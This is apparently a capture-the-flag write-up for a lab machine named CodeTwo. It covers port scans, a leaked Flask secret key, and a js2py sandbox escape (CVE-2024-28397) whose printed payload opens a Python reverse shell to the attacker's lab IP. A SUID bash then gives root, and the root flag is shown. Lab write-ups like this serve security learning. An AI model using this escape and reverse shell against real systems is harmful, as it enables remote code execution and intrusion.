This machine was just released which is exiting since it's going to use new CVE's and there isn't as much info on it on the web

But let's start with a port scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.11.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 07:26 EEST
Nmap scan report for 10.10.11.82
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds
                                                                                                  
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,8000 -sC -sV 10.10.11.82           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 07:27 EEST
Nmap scan report for 10.10.11.82
Host is up (0.097s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:00f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodeTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
```
So there is ssh and a website.

I fuzzed for subdirectories but there was nothing of interest. This is called codetwo and is similar to codeone i've done previously. In this one we have to abuse the javascript code editor but in the other one we had to abuse a python one.

I was looking at the code of the app and saw this
```bash
app.secret_key = 'S3cr3tK3yC0d3Tw0'
```
Ï tried to use flask-unsign to forge the session cookies to admin, but that didn't work
```bash
root@9250b5b3b3d2:/# flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6InRlc3QifQ.aKGDFA.Kg7v5yKJ1OIR47YJnQF71JG7Z2w" --secret "S3cr3tK3yC0d3Tw0"
{'username': 'test'}
```

I found a js2py exploit

https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc?tab=readme-ov-file

```bash
let cmd = "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('10.10.14.8',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\"";

let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") return item;
        if (item.__name__ != "type" && (result = findpopen(item))) return result;
    }
}

// Käytetään Popen ilman communicate()
findpopen(obj)([cmd], -1, null, -1, -1, -1, null, null, true);

```
I was able to get a reverse shell with this code.

Not sure what happened but after doing linpeas.sh scan i saw 
```bash
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash
```
And we were easily able to get privesc with 
```bash
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
d5f08352d02fd009fc591eeae08944b6
```

That was quite anticlimatic
